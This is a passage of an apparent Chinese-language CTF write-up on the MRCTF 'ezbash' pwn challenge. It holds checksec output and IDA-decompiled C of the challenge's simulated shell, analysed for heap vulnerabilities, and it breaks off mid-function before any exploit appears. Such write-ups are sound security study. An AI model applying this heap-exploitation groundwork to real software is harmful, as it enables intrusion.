



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="我他喵的" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="我他喵的" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="我他喵的" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="writeup" />


<link rel="canonical" href="http://example.com/2022/04/25/MRCTF-ezbash/">



  <title>
MRCTF_ezbash - pwn |
dreamcat = 我他喵的</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">MRCTF_ezbash
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2022-04-25 12:53:57">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2022-04-25T12:53:57+08:00">2022-04-25</time>
  </span>
  <span class="item" title="Symbols count in article">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">Symbols count in article</span>
    <span>28k</span>
    <span class="text">words</span>
  </span>
  <span class="item" title="Reading time">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">Reading time</span>
    <span>25 mins.</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">dreamcat</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclflwv2aj20zk0m84qp.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclwrdwyaj20zk0m8are.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipew8gmvyj20zk0m87wh.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gicli9lfebj20zk0m84qp.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclil3m4ej20zk0m8tn8.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipet4bz0yj20zk0m8e81.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/pwn/" itemprop="item" rel="index" title="In pwn"><span itemprop="name">pwn</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
  <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/25/MRCTF-ezbash/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="dreamcat">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="我他喵的">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="mrctf-pwnezbash"><a class="markdownIt-Anchor" href="#mrctf-pwnezbash">#</a> MRCTF 	pwn	ezbash</h1>
<p>拿到题目的时候，直接运行起来发现是一个文件系统，怀疑是不是一个 kernel 的题目，但是并没有给出内核文件，所以认定了就是一道堆题。这也是我坚持做下去的原因。</p>
<h2 id="题目链接"><a class="markdownIt-Anchor" href="#题目链接">#</a> 题目链接</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RyZWFta2VjYXQvZHJlYW1rZWNhdC5naXRodWIuaW8vdHJlZS9tYWluL2NoYWxsZW5nZS9NUmN0Zl9lemJhc2g=">https://github.com/dreamkecat/dreamkecat.github.io/tree/main/challenge/MRctf_ezbash</span></p>
<h2 id="环境"><a class="markdownIt-Anchor" href="#环境">#</a> 环境</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dreamcat@ubuntu:~/Desktop/mrctf/ezbash$ strings libc.so.6 |grep ubuntu</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.7) stable release version 2.31.</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+<span class="built_in">source</span>/glibc/+bugs&gt;.</span><br><span class="line">dreamcat@ubuntu:~/Desktop/mrctf/ezbash$  checksec --file=ezbash</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br><span class="line">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols	  No	0		7		ezbash</span><br><span class="line">dreamcat@ubuntu:~/Desktop/mrctf/ezbash$ </span><br></pre></td></tr></table></figure>
<p>2.31 的题目，保护全开，八成就是堆题；</p>
<p>程序模拟了一个简单的文件系统，提供了 11 种命令，对于我们命令行的输出，程序会进行切片</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dreamcat@ubuntu:~/Desktop/mrctf/ezbash$ ./ezbash</span><br><span class="line">hacker:/$ <span class="built_in">help</span></span><br><span class="line">Welcome to ezbash</span><br><span class="line">Just have fun here!</span><br><span class="line">The following are built <span class="keyword">in</span>:</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">cat</span></span><br><span class="line"><span class="built_in">touch</span></span><br><span class="line"><span class="built_in">rm</span></span><br><span class="line"><span class="built_in">mkdir</span></span><br><span class="line"><span class="built_in">cp</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">help</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">hacker:/$</span><br></pre></td></tr></table></figure>
<p>解决题目的第一个难点就是对于代码的审计，因为命令太多，相较于传统的菜单堆题，这道题提供的命令太多，导致分析题目需要很多时间。</p>
<h2 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程">#</a> 解题过程</h2>
<h3 id="题目的整体把握"><a class="markdownIt-Anchor" href="#题目的整体把握">#</a> 题目的整体把握</h3>
<p>题目的所有文件的操作都是基于堆块，以及链表的数据结构</p>
<p>重要的结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> file            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x40</span>, mappedto_9)</span><br><span class="line"><span class="number">00000000</span> flag            dd ?</span><br><span class="line"><span class="number">00000004</span> name            db <span class="number">16</span> dup(?)            ; <span class="built_in">string</span>(C)</span><br><span class="line"><span class="number">00000014</span> field_14        dd ?</span><br><span class="line"><span class="number">00000018</span> context         dq ?                    ; offset</span><br><span class="line"><span class="number">00000020</span> prev_bro        dq ?                    ; offset</span><br><span class="line"><span class="number">00000028</span> next_bro        dq ?                    ; offset</span><br><span class="line"><span class="number">00000030</span> futher          dq ?                    ; offset</span><br><span class="line"><span class="number">00000038</span> firstson        dq ?                    ; offset</span><br><span class="line"><span class="number">00000040</span> file            ends</span><br></pre></td></tr></table></figure>
<p>整个体系中，其实概括 i 起来就是对于目录以及文件的操作，而这些对象都是基于 file 的结构体。flag 标志，对应的是目录（文件夹）或者文件，flag=0，表示的是文件夹，flag=1 表示的文件。文件夹中的所有子文件以及子文件夹都会通过一个双链表联系起来。file 的 firstson 会储存子文件链表的头指针。头节点的 prev_bro 和尾节点的 neat_bro 为 0，name16 字节的数组是 file 的名字，文件夹还会记录自己的父文件夹是的指针。文件则不会，但是文件会有一个特殊的 context 指针，指向另外一个堆块，用于储存写入文件的内容。</p>
<p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *<span class="title function_">readn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *ptr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0x150</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x150</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;ezbash: allocation error\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x19</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">-1</span> || v3 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ptr[v2++] = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 += <span class="number">0x150</span>;</span><br><span class="line">      ptr = <span class="built_in">realloc</span>(ptr, v1);</span><br><span class="line">      <span class="keyword">if</span> ( !ptr )</span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;ezbash: allocation error\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x19</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ptr[v2] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于我们输入的命令默认是存放在一个 0x161 的堆块，但是当我们输入的长度过长时，会调整堆块的大小，所以这里是不存在在溢出的，虽然结尾没有补零，但是每次都会被 v1=0x150 限制，没有溢出的利用。</p>
<p>对于每条命令，他的解析不是直接的匹配，而是会对数据进行切片的处理，如下，调用 strtok 库函数，会返回 delim 的前地址（代码中可能是由于 idapro 分析错误， i = strtok (0LL, &quot;\t\r\n\a&quot;)，实际上会完全分析我们输入的命令，应该是 i = strtok (i, &quot;\t\r\n\a&quot;)）这里会将我们的命令分解成操作命令，对象，对吧对应字符串的地址保存在另一个堆块里面。strtok 遇到空字符结束。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall <span class="title function_">process</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  _QWORD *ptr; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">64</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;ezbash: allocation error\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x19</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = strtok(a1, <span class="string">&quot; \t\r\n\a&quot;</span>); i; i = strtok(<span class="number">0LL</span>, <span class="string">&quot; \t\r\n\a&quot;</span>) )<span class="comment">// split</span></span><br><span class="line">  &#123;</span><br><span class="line">    ptr[v3++] = i;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt;= v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 += <span class="number">0x40</span>;</span><br><span class="line">      ptr = <span class="built_in">realloc</span>(ptr, <span class="number">8LL</span> * v2);</span><br><span class="line">      <span class="keyword">if</span> ( !ptr )</span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;ezbash: allocation error\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x19</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ptr[v3] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后面指令的实现都是通过保留的字符串指针分析比较的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check</span><span class="params">(<span class="type">const</span> <span class="type">char</span> **cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !*cmd )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; L11(); ++i )                 <span class="comment">// i&lt;11</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(*cmd, *(&amp;<span class="built_in">list</span> + i)) )</span><br><span class="line">      <span class="keyword">return</span> (funcs[i])(cmd);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s: command not found\n&quot;</span>, *cmd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>list 保存各个命令的名称进行比较，cmd 是处理后的保留字符串地址的 chunk。fucns 保存各个命令的函数的地址。</p>
<p>程序会使用 2 个全局变量记录我们的当前位置，一个是我们所在的文件夹的指针，一个是字符串记录的是从 home 到当前位置的路径的名字。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0000000000006140</span> cur_position_addr db <span class="number">50</span>h <span class="title function_">dup</span><span class="params">(?)</span>         ; DATA XREF: apwd+<span class="number">10</span>↑o</span><br><span class="line">.bss:<span class="number">0000000000006140</span>                                         ; acd+<span class="number">10F</span>↑o ...</span><br><span class="line">.bss:<span class="number">0000000000006190</span> ; file *cuurr_pos</span><br><span class="line">.bss:<span class="number">0000000000006190</span> cuurr_pos       dq ?                    ; DATA XREF: unlink:loc_15F0↑r</span><br></pre></td></tr></table></figure>
<p>其实真正利用的命令没有多少，ls，pwd，help，exit，cd，cat，touch, 都没有漏洞的利用。</p>
<h4 id="ls"><a class="markdownIt-Anchor" href="#ls">#</a> ls</h4>
<p>列出当前文件夹下的内容，或者以及子文件夹的内容，成灰只可以识别到以及子文件夹，对于 A/B, 成为程序人为这是一个 file 的名称，而不是一条路径。但是./A 是有效的，程序会识别./ 为当前目录。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">als</span><span class="params">(<span class="type">const</span> <span class="type">char</span> **cmd, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  __int64 v10[<span class="number">3</span>]; <span class="comment">// [rsp+8h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **comment; <span class="comment">// [rsp+20h] [rbp-88h]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [rsp+37h] [rbp-71h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+38h] [rbp-70h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+3Ch] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">int</span> nums; <span class="comment">// [rsp+40h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+44h] [rbp-64h]</span></span><br><span class="line">  file *v17; <span class="comment">// [rsp+48h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+50h] [rbp-58h]</span></span><br><span class="line">  file *v19; <span class="comment">// [rsp+58h] [rbp-50h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+60h] [rbp-48h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+68h] [rbp-40h]</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+70h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> delim[<span class="number">2</span>]; <span class="comment">// [rsp+7Eh] [rbp-2Ah] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v24; <span class="comment">// [rsp+80h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  comment = cmd;</span><br><span class="line">  v24 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v17 = cuurr_pos-&gt;firstson;</span><br><span class="line">  v19 = cuurr_pos;</span><br><span class="line">  v20 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  nums = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(delim, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( comment[++nums] )                     <span class="comment">// 只有ls 就会跳过</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(comment[nums]) &lt;= v14 )</span><br><span class="line">      v2 = v14;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v2 = <span class="built_in">strlen</span>(comment[nums]) + <span class="number">1</span>;</span><br><span class="line">    v14 = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  v21 = v14 - <span class="number">1LL</span>;</span><br><span class="line">  v10[<span class="number">0</span>] = v14;</span><br><span class="line">  v10[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v3 = <span class="number">16</span> * ((v14 + <span class="number">15LL</span>) / <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( v10 != (v10 - (v3 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL)) )</span><br><span class="line">    ;</span><br><span class="line">  v4 = alloca(v3 &amp; <span class="number">0xFFF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &amp; <span class="number">0xFFF</span>) != <span class="number">0</span> )</span><br><span class="line">    *(&amp;v10[<span class="number">-1</span>] + (v3 &amp; <span class="number">0xFFF</span>)) = *(&amp;v10[<span class="number">-1</span>] + (v3 &amp; <span class="number">0xFFF</span>));</span><br><span class="line">  dest = v10;</span><br><span class="line">  v16 = nums - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( nums == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    info_ls();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  nums = <span class="number">1</span>;</span><br><span class="line">LABEL_44:</span><br><span class="line">  <span class="keyword">if</span> ( nums &lt;= v16 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="built_in">strlen</span>(comment[nums]);</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, comment[nums]);</span><br><span class="line">    <span class="keyword">for</span> ( s1 = strtok(dest, delim); ; s1 = strtok(<span class="number">0LL</span>, delim) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !s1 )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_43:</span><br><span class="line">        cuurr_pos = v19;</span><br><span class="line">        ++nums;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">      &#125;</span><br><span class="line">      v17 = cuurr_pos-&gt;firstson;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;.&quot;</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, off_4077) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v12 = findfile(&amp;v17, s1);</span><br><span class="line">      <span class="keyword">if</span> ( v12 != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: cannot access &#x27;%s&#x27;: No such file or directory\n&quot;</span>, s1);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( checkfile(v17) )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = v14;</span><br><span class="line">        v8 = <span class="built_in">strlen</span>(s1);</span><br><span class="line">    